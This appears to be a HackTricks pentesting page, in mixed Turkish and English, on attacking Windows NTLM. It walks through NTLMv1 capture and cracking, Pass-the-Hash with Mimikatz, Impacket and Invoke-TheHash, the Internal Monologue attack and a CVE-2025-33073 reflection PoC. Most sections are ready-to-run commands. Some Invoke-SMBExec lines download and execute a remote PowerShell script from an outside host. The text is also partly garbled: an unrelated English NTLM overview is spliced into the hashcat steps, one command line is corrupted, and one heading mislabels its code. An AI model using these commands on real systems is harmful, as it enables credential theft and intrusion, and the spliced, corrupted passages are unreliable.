# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

**Windows XP ve Server 2003** kullanılan ortamlarda LM (Lan Manager) hash'leri kullanılır, ancak bunların kolayca ele geçirilebildiği yaygın olarak bilinir. Belirli bir LM hash'i olan `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir durumu gösterir ve boş string için hash'i temsil eder.

Varsayılan olarak, **Kerberos** authentication protocol birincil yöntemdir. NTLM (NT LAN Manager) şu durumlarda devreye girer: Active Directory olmaması, domain'in bulunmaması, yanlış configuration nedeniyle Kerberos'un düzgün çalışmaması veya geçerli bir hostname yerine IP address kullanılarak bağlantı denenmesi.

Network paketlerinde **"NTLMSSP"** header'ının bulunması, bir NTLM authentication process olduğunu gösterir.

Authentication protocol'leri - LM, NTLMv1 ve NTLMv2 - desteği, `%windir%\Windows\System32\msv1\_0.dll` konumundaki belirli bir DLL tarafından sağlanır.

**Temel Noktalar**:

- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) kullanılmadığını gösterir.
- Kerberos varsayılan authentication method'dur, NTLM ise yalnızca belirli koşullarda kullanılır.
- NTLM authentication paketleri "NTLMSSP" header'ı ile ayırt edilebilir.
- LM, NTLMv1 ve NTLMv2 protocol'leri sistem dosyası `msv1\_0.dll` tarafından desteklenir.

## LM, NTLMv1 and NTLMv2

Hangi protocol'ün kullanılacağını kontrol edebilir ve ayarlayabilirsiniz:

### GUI

_execute_ _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 6 seviye vardır (0'dan 5'e kadar).

![](<../../images/image (919).png>)

### Registry

Bu, seviye 5'i ayarlayacaktır:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Olası değerler:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** kendi **credentials** bilgilerini girer
2. client machine, **domain name** ve **username** göndererek bir **authentication request** yollar
3. **server** **challenge** gönderir
4. **client**, **password** hash’ini key olarak kullanarak **challenge**’ı şifreler ve response olarak gönderir
5. **server**, **domain controller**’a **domain name, username, challenge ve response** gönderir. Eğer bir Active Directory yapılandırılmamışsa veya domain name server’ın adıysa, credentials **locally** kontrol edilir.
6. **domain controller** her şeyin doğru olup olmadığını kontrol eder ve bilgiyi server’a gönderir

**server** ve **Domain Controller**, Domain Controller server’ın password’ünü bildiği için (**NTDS.DIT** db içinde bulunur), **Netlogon** server üzerinden bir **Secure Channel** oluşturabilir.

### Local NTLM authentication Scheme

Authentication, yukarıda bahsedilenle aynıdır **but** **server**, **SAM** dosyası içinde authenticate olmaya çalışan **user**’ın **hash**’ini bilir. Yani Domain Controller’a sormak yerine, **server** kullanıcının authenticate olup olamayacağını **kendi** kontrol eder.

### NTLMv1 Challenge

**challenge** uzunluğu **8 bytes**’tır ve **response** uzunluğu **24 bytes**’tır.

**NT hash (16bytes)**, **3 parçaya** bölünür, her biri **7bytes**: (7B + 7B + (2B+0x00\*5)): **son parça zeros** ile doldurulur. Ardından **challenge**, her parça ile ayrı ayrı **ciphered** edilir ve ortaya çıkan **ciphered** bytes birleştirilir. Toplam: 8B + 8B + 8B = 24Bytes.

**Problems**:

- **randomness** eksikliği
- 3 parça, NT hash’i bulmak için ayrı ayrı **attacked** edilebilir
- **DES crackable**
- 3º key her zaman **5 zeros**’dan oluşur.
- Aynı **challenge** verildiğinde **response** aynı olacaktır. Bu yüzden kurbana **challenge** olarak "**1122334455667788**" string’ini verebilir ve **precomputed rainbow tables** kullanarak response’a saldırabilirsiniz.

### NTLMv1 attack

Günümüzde **Unconstrained Delegation** yapılandırılmış environment’lar bulmak daha az yaygın hale geliyor, ancak bu, yapılandırılmış bir **Print Spooler service**’i **abuse** edemeyeceğiniz anlamına gelmez.

AD üzerinde zaten sahip olduğunuz bazı credentials/sessions’ları kullanarak printer’dan kontrolünüz altındaki bir **host**’a authenticate olmasını isteyebilirsiniz. Sonra `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak authentication challenge’ı `1122334455667788` olarak ayarlayabilir, authentication denemesini capture edebilir ve eğer **NTLMv1** kullanıldıysa bunu **crack** edebilirsiniz.\
`responder` kullanıyorsanız, authentication’ı **downgrade** etmeyi denemek için `--lm` flag’ini kullanabilirsiniz.\
_Not: Bu teknik için authentication’ın NTLMv1 kullanılarak yapılması gerekir (NTLMv2 geçerli değildir)._

Unutmayın ki printer authentication sırasında computer account kullanacaktır ve computer accounts genellikle **long and random passwords** kullanır; bunları normal **dictionaries** ile **probably** crack edemezsiniz. Ancak **NTLMv1** authentication **DES** kullanır ([more info here](#ntlmv1-challenge)), bu yüzden özellikle DES crack etmeye adanmış bazı servisleri kullanarak bunu crack edebilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 ayrıca NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ile de kırılabilir; bu araç NTLMv1 mesajlarını hashcat ile kırılabilecek bir yöntemle formatlar.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
aşağıdakini çıktı olarak verirdi:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
EOF
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Hashcat'i çalıştırın (bunu hashtopolis gibi bir araç üzerinden dağıtılmış şekilde yapmak en iyisidir), çünkü aksi halde bu işlem birkaç gün sürecektir.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Bu durumda bunun için şifrenin password olduğunu biliyoruz, bu yüzden demo amaçları için hile yapacağız:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Şimdi cracked edilmiş des keys'i NTLM hash'in parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Son olarak son kısım:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

Network Authentication. `NTLM` is an authentication protocol used by `Windows` to authenticate users and computers in a network. It is generally used in `Active Directory` environments.

The `NTLM` authentication process works in 3 steps:

1. `Client` sends a `NEGOTIATE_MESSAGE` to `Server`
2. `Server` sends a `CHALLENGE_MESSAGE` to `Client`
3. `Client` sends an `AUTHENTICATE_MESSAGE` to `Server`

This process is also known as a **challenge-response** authentication mechanism.

### NTLM Hashes

The `NTLM` hash is the result of applying the `MD4` hash algorithm to the `Unicode` password. This hash is used to authenticate the user without sending the password in clear text over the network.

The `NTLM` hash is **not salted**, which means it is vulnerable to **rainbow table** attacks.

### NTLM Relay

`NTLM Relay` is an attack that intercepts and relays `NTLM` authentication messages between a `Client` and a `Server` without decrypting or modifying them.

This attack is possible because `NTLM` does not protect against `man-in-the-middle` attacks.

### NTLMv1 vs NTLMv2

`NTLMv1` is an older version of the protocol, while `NTLMv2` is a more secure version.

`NTLMv2` adds:
- `HMAC-MD5`
- A client challenge
- A timestamp

### Common Attacks

- `Pass-the-Hash`
- `Pass-the-Ticket`
- `NTLM Relay`
- `Credential Capture`

### Mitigations

- Disable `NTLM` where possible
- Use `Kerberos`
- Enforce `SMB signing`
- Require `LDAP signing`
- Enable `Extended Protection for Authentication`

### References

- [Microsoft NTLM documentation](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/ntlm-overview)
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length** 8 byte’dır ve **2 response** gönderilir: Biri **24 byte** uzunluğundadır ve **diğerinin** uzunluğu değişkendir.

**İlk response**, **client and the domain** tarafından oluşturulan **string**’in **HMAC_MD5** ile şifrelenmesi ve **NT hash**’inin **hash MD4**’ünün **key** olarak kullanılmasıyla oluşturulur. Ardından, **result** yine **HMAC_MD5** ile **challenge**’ı şifrelemek için **key** olarak kullanılır. Buna **8 byte’lık bir client challenge** eklenir. Toplam: 24 B.

**İkinci response** ise **birkaç değer** kullanılarak oluşturulur (yeni bir client challenge, **replay attacks**’i önlemek için bir **timestamp**...)

Eğer **başarılı bir authentication process** yakalamış bir **pcap**’iniz varsa, domain, username, challenge ve response’u almak ve password’ü kırmayı denemek için bu kılavuzu takip edebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Kurbanın hash’ini** aldıktan sonra, onu **taklit etmek** için kullanabilirsiniz.\
**Bu hash kullanılarak** **NTLM authentication** gerçekleştirecek bir **tool** kullanmanız gerekir, **veya** yeni bir **sessionlogon** oluşturup o **hash**’i **LSASS** içine **inject** edebilirsiniz; böylece herhangi bir **NTLM authentication** gerçekleştirildiğinde, o **hash** kullanılacaktır. Son seçenek mimikatz’in yaptığı şeydir.

**Lütfen, Pass-the-Hash attacks’i Computer accounts kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Administrator olarak çalıştırılmalıdır**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Bu, mimikatz’i başlatan kullanıcıların sahip olacağı bir process başlatır; ancak LSASS içinde kayıtlı credentials, mimikatz parametrelerindeki olanlardır. Ardından, ağ kaynaklarına sanki o kullanıcıymışsınız gibi erişebilirsiniz (`runas /netonly` hilesine benzer, ama düz metin parolayı bilmeniz gerekmez).

### Pass-the-Hash from linux

Linux’tan Windows makinelerinde Pass-the-Hash kullanarak code execution elde edebilirsiniz.\
[**Nasıl yapılacağını öğrenmek için buraya erişin.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Windows için impacket binary’lerini [buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Bu durumda bir command belirtmeniz gerekir, interactive shell elde etmek için cmd.exe ve powershell.exe geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daha birçok Impacket binary’si var...

### Invoke-TheHash

PowerShell script’lerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Bu fonksiyon, **diğerlerinin hepsinin bir karışımıdır**. **Birkaç host** verebilir, bazılarını **hariç tutabilir** ve kullanmak istediğiniz **seçeneği** (_SMBExec, WMIExec, SMBClient, SMBEnum_) **seçebilirsiniz**. Eğer **SMBExec** ve **WMIExec** seçeneklerinden **herhangi birini** seçer ama **Command** parametresi vermezseniz, sadece **yeterli yetkilere** sahip olup olmadığınızı **kontrol eder**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılması gerekir**

Bu araç, mimikatz ile aynı şeyi yapacaktır (LSASS belleğini değiştirir).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Kullanıcı adı ve parola ile manuel Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Bir Windows Host'tan credentials çıkarma

**Daha fazla bilgi için** [**Windows host'tan credentials nasıl elde edilir bu sayfayı okumalısınız**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack, bir saldırganın **LSASS process ile doğrudan etkileşime girmeden** kurbanın makinesinden NTLM hash'lerini almasını sağlayan gizli bir credential extraction tekniğidir. Hash'leri doğrudan memory'den okuyan ve endpoint security çözümleri ya da Credential Guard tarafından sıkça engellenen Mimikatz'in aksine, bu attack **Security Support Provider Interface (SSPI) üzerinden NTLM authentication package (MSV1_0)'a yapılan local calls**'dan yararlanır. Saldırgan önce NetNTLMv1'in izinli olması için **NTLM settings**'i düşürür (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic). Ardından çalışan process'lerden alınan mevcut user token'larını taklit eder ve bilinen bir challenge kullanarak yerel olarak NTLM authentication tetikler ve NetNTLMv1 response üretir.

Bu NetNTLMv1 response'lar yakalandıktan sonra, saldırgan **önceden hesaplanmış rainbow table'lar** kullanarak orijinal NTLM hash'lerini hızlıca geri elde edebilir; bu da lateral movement için ek Pass-the-Hash attack'lerine imkan verir. Kritik olarak, Internal Monologue Attack network traffic üretmediği, code inject etmediği veya doğrudan memory dump tetiklemediği için gizli kalır; bu da onu Mimikatz gibi geleneksel yöntemlere kıyasla defenders tarafından tespit etmeyi zorlaştırır.

Eğer zorlanan security policies nedeniyle NetNTLMv1 kabul edilmezse, saldırgan bir NetNTLMv1 response elde edemeyebilir.

Bu durumu ele almak için Internal Monologue tool güncellendi: NetNTLMv1 başarısız olursa yine de **NetNTLMv2 responses capture** etmek için `AcceptSecurityContext()` kullanarak dinamik biçimde bir server token alır. NetNTLMv2 kırılması çok daha zor olsa da, sınırlı durumlarda yine de relay attack'ler veya offline brute-force için bir yol açar.

PoC şu adreste bulunabilir: **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay ve Responder

**Bu attack'leri nasıl yapacağınıza dair daha detaylı rehberi burada okuyun:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Network capture'dan NTLM challenges parse etme

**Şunu kullanabilirsiniz** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPN'ler üzerinden NTLM & Kerberos *Reflection* (CVE-2025-33073)

Windows, bir host'tan kaynaklanan bir NTLM (veya Kerberos) authentication'ın **aynı** host'a SYSTEM privileges elde etmek için geri relay edilmesini engellemeye çalışan birkaç mitigation içerir.

Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki yamalarla çoğu public chain'i bozdu; ancak **CVE-2025-33073**, **SMB client'ın marshalled* (serialized) target-info içeren Service Principal Name (SPN)'leri nasıl truncate ettiğini** kötüye kullanarak bu protection'ların hâlâ bypass edilebildiğini gösteriyor.

### Bug'ın TL;DR'si
1. Saldırgan, marshalled bir SPN kodlayan bir **DNS A-record** kaydeder; ör.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Kurban, o hostname'e authentication yapmaya zorlanır (PetitPotam, DFSCoerce, vb.).
3. SMB client target string `cifs/srv11UWhRCAAAAA…` değerini `lsasrv!LsapCheckMarshalledTargetInfo`'ya ilettiğinde, `CredUnmarshalTargetInfo` çağrısı serialized blob'u **çıkarır**, geriye **`cifs/srv1`** kalır.
4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos eşdeğeri) artık target'ı *localhost* olarak görür çünkü kısa host kısmı computer name ile eşleşir (`SRV1`).
5. Sonuç olarak, server `NTLMSSP_NEGOTIATE_LOCAL_CALL` ayarlar ve context'e **LSASS'ün SYSTEM access-token**'ını enjekte eder (Kerberos için SYSTEM işaretli bir subsession key oluşturulur).
6. Bu authentication'ı `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host üzerinde tam SYSTEM yetkileri verir.

### Hızlı PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* **CVE-2025-33073** için KB patch, `mrxsmb.sys::SmbCeCreateSrvCall` içine, hedefi marshalled info içeren herhangi bir SMB connection’ı engelleyen bir kontrol ekler (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Yamalanmamış host’larda bile reflection’ı önlemek için **SMB signing** zorlayın.
* `*<base64>...*` benzeri DNS records’ları izleyin ve coercion vektörlerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.

### Detection ideas
* İstemci IP’si ≠ server IP’si olan `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren network captures.
* Subsession key içeren ve client principal’ı hostname ile aynı olan bir Kerberos AP-REQ.
* Aynı host’tan gelen remote SMB writes ile hemen ardından gelen Windows Event 4624/4648 SYSTEM logon’ları.

**March 2026** local reflection variant’ının, `NT AUTHORITY\SYSTEM`’e ulaşmak için **SMB arbitrary ports** ve **TCP connection reuse** kullandığı durum için, bkz:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
